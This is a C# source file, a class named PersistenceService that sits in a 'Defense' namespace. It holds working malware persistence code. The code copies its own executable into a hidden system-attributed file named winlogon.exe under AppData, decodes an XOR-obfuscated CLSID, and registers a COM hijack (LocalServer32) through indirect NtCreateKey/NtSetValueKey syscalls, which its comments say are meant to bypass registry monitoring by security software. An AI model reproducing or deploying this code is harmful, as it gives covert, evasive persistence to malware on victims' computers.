using System;
using System.IO;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Text;
using VanguardCore;

namespace VanguardCore.Defense
{
    public static class PersistenceService
    {
        // [PRO] Stealth Native Persistence via Indirect Syscalls
        // Bypassing RegistryFilter callbacks by using NtCreateKey / NtSetValueKey
        
        private static readonly byte[] _clsidEnc = { 0x4C, 0x76, 0x72, 0x67, 0x62, 0x61, 0x07, 0x04, 0x77, 0x70, 0x07, 0x40, 0x79, 0x74, 0x76, 0x70, 0x07, 0x6E, 0x70, 0x71, 0x00, 0x07, 0x77, 0x76, 0x71, 0x4E, 0x7E, 0x70, 0x74, 0x71, 0x41, 0x74, 0x71, 0x76, 0x00, 0x0F, 0x7F }; 
        
        private static string D(byte[] b) {
            byte[] d = new byte[b.Length];
            for (int i = 0; i < b.Length; i++) d[i] = (byte)(b[i] ^ 0x37);
            return Encoding.UTF8.GetString(d);
        }

        public static void InstallStealthProxy()
        {
            try
            {
                SyscallManager.Initialize();
                var ntCreateKey = SyscallManager.GetSyscallDelegate<SyscallManager.NtCreateKey>("NtCreateKey");
                var ntSetValueKey = SyscallManager.GetSyscallDelegate<SyscallManager.NtSetValueKey>("NtSetValueKey");
                if (ntCreateKey == null || ntSetValueKey == null) return;

                string ghostPath = GhostSelf();
                if (string.IsNullOrEmpty(ghostPath)) return;

                // [PRO] Resolve Native Registry Path (\Registry\User\<SID>\...)
                string userSid = WindowsIdentity.GetCurrent().User?.Value ?? "";
                if (string.IsNullOrEmpty(userSid)) return;

                // Software\Classes\CLSID\{...}\LocalServer32
                string subKeyPath = $@"Software\Classes\CLSID\{D(_clsidEnc)}\LocalServer32";
                string nativePath = $@"\Registry\User\{userSid}\{subKeyPath}";

                // 1. Create/Open Key
                SyscallManager.OBJECT_ATTRIBUTES oa = new SyscallManager.OBJECT_ATTRIBUTES(nativePath, 0x40); // OBJ_CASE_INSENSITIVE
                IntPtr hKey; uint disp;
                uint status = ntCreateKey(out hKey, 0xF003F, ref oa, 0, IntPtr.Zero, 0, out disp); // KEY_ALL_ACCESS
                oa.Free();

                if (status == 0 && hKey != IntPtr.Zero)
                {
                    // 2. Set Value (Default value is empty name)
                    SyscallManager.UNICODE_STRING valName = new SyscallManager.UNICODE_STRING("");
                    byte[] data = Encoding.Unicode.GetBytes(ghostPath + "\0");
                    ntSetValueKey(hKey, ref valName, 0, 1, data, (uint)data.Length); // REG_SZ
                    valName.Free();
                    
                    CloseHandle(hKey);
                }
            }
            catch { }
        }

        private static string GhostSelf()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string ghostDir = Path.Combine(appData, "Microsoft", "Windows", "SoftwareUpdate");
                if (!Directory.Exists(ghostDir)) Directory.CreateDirectory(ghostDir);
                string ghostPath = Path.Combine(ghostDir, "winlogon.exe");

                string selfPath = GetSelfPath();
                if (!File.Exists(ghostPath))
                {
                    File.Copy(selfPath, ghostPath, true);
                    File.SetAttributes(ghostPath, FileAttributes.Hidden | FileAttributes.System);
                }
                return ghostPath;
            }
            catch { return null; }
        }

        private static string GetSelfPath()
        {
            var sb = new StringBuilder(1024);
            Win32_GetModuleFileName(IntPtr.Zero, sb, (uint)sb.Capacity);
            return sb.ToString();
        }

        [DllImport("kernel32.dll", EntryPoint = "GetModuleFileNameW")] private static extern uint Win32_GetModuleFileName(IntPtr hModule, [Out] StringBuilder lpFilename, uint nSize);
        [DllImport("ntdll.dll")] private static extern uint NtClose(IntPtr handle);
        private static void CloseHandle(IntPtr h) => NtClose(h);
    }
}
